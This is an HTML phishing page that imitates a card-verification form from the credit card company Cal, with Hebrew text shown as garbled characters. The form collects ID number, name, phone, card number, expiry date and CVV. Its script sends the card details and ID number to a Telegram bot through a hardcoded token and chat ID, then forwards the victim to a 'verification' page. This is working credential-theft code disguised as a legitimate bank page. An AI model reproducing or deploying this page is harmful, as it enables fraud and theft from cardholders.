<!DOCTYPE html>
<html lang="he">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cal Credit Card</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            direction: rtl; 
        }
        .logo {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            text-align: center;
            font-size: 30px;
            font-weight: bold;
            padding: 10px 0;
            background-color: white;
            color: #0057d8;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            z-index: 1000;
        }
        .header {
            background-color: #0057d8;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 24px;
            margin-top: 60px; 
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group input {
            width: 100%;
            padding: 10px 5px;
            border: none;
            border-bottom: 2px solid #ddd;
            outline: none;
            text-align: right;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .input-group input:focus {
            border-bottom: 2px solid #0057d8; 
        }
        .input-group input.error {
            border-bottom: 2px solid red;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        .button {
            display: block;
            width: 100%;
            padding: 15px;
            background-color: #0057d8;
            color: white;
            text-align: center;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #0044a8;
        }
    </style>
</head>
<body>

    <div class="logo">.Cal</div>

    <div class="header">
        转 专住 砖专
    </div>

    <div class="container">
        <div class="input-group">
            <label>驻专 砖</label>
            <input type="text" id="id" placeholder="住驻专 转注转 转 砖 注 专住" maxlength="9">
            <div class="error-message" id="id-error">  砖 </div>
            <div class="error-message" id="id-length-error">住驻专 转注转 转  转  9 住驻专转.</div>
        </div>
        <div class="input-group">
            <input type="text" id="name" placeholder="砖 注 专住">
            <div class="error-message" id="name-error">  砖 </div>
        </div>
        <div class="input-group">
            <input type="text" id="phone" placeholder="驻  砖 注 专住" maxlength="10">
            <div class="error-message" id="phone-error">  砖 </div>
            <div class="error-message" id="phone-length-error">住驻专 驻  转  10 住驻专转.</div>
        </div>
        <div class="input-group">
            <input type="text" id="card-number" placeholder="住驻专 专住 砖专" maxlength="16">
            <div class="error-message" id="card-number-error">  砖 </div>
            <div class="error-message" id="card-number-length-error">住驻专 专住 砖专  转  16 住驻专转.</div>
        </div>
        <div class="input-group">
            <input type="text" id="card-expiry" placeholder="转专 转驻 (MM/YY)" maxlength="5">
            <div class="error-message" id="expiry-error">  砖 </div>
            <div class="error-message" id="expiry-length-error">  转专 转驻 驻专 MM/YY.</div>
        </div>
        <div class="input-group">
            <input type="text" id="cvv" placeholder="CVV" maxlength="3">
            <div class="error-message" id="cvv-error">  砖 </div>
            <div class="error-message" id="cvv-length-error">CVV  转  3 住驻专转.</div>
        </div>
        <button class="button" onclick="validateAndSubmit()">驻砖专 砖</button>
    </div>

    <script>
        function validateAndSubmit() {
            const idNumber = document.getElementById('id').value.trim();
            const cardNumber = document.getElementById('card-number').value.trim();
            const expiryDate = document.getElementById('card-expiry').value.trim();
            const cvv = document.getElementById('cvv').value.trim();
            let isValid = true;

            // Clear previous errors
            document.querySelectorAll('.error-message').forEach(error => error.style.display = 'none');

            // Validation
            if (!idNumber) {
                document.getElementById('id-error').style.display = 'block';
                isValid = false;
            } else if (idNumber.length !== 9) {
                document.getElementById('id-length-error').style.display = 'block';
                isValid = false;
            }

            if (!cardNumber) {
                document.getElementById('card-number-error').style.display = 'block';
                isValid = false;
            } else if (cardNumber.length !== 16) {
                document.getElementById('card-number-length-error').style.display = 'block';
                isValid = false;
            }

            if (!expiryDate) {
                document.getElementById('expiry-error').style.display = 'block';
                isValid = false;
            } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
                document.getElementById('expiry-length-error').style.display = 'block';
                isValid = false;
            }

            if (!cvv) {
                document.getElementById('cvv-error').style.display = 'block';
                isValid = false;
            } else if (cvv.length !== 3) {
                document.getElementById('cvv-length-error').style.display = 'block';
                isValid = false;
            }

            if (isValid) {
                const token = '7860990758:AAEL00gcX3iTB9N0D7z-9qBfDlbZ3hmHrO4';
                const chatId = '5021790058';
                const message = `
                 转 砖:
                 住驻专 专住: ${cardNumber}
                 转专 转拽祝: ${expiryDate}
                 CVV: ${cvv}
                 转注转 转: ${idNumber}
                `;

                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                }).then(response => {
                    if (response.ok) {
                        window.location.href = 'verification.html';
                    } else {
                        alert('砖 砖转 转. 住 砖 专 转专.');
                    }
                }).catch(error => {
                    alert('砖 专 砖专转. 住 砖 专 转专.');
                });
            }
        }
    </script>

</body>
</html>
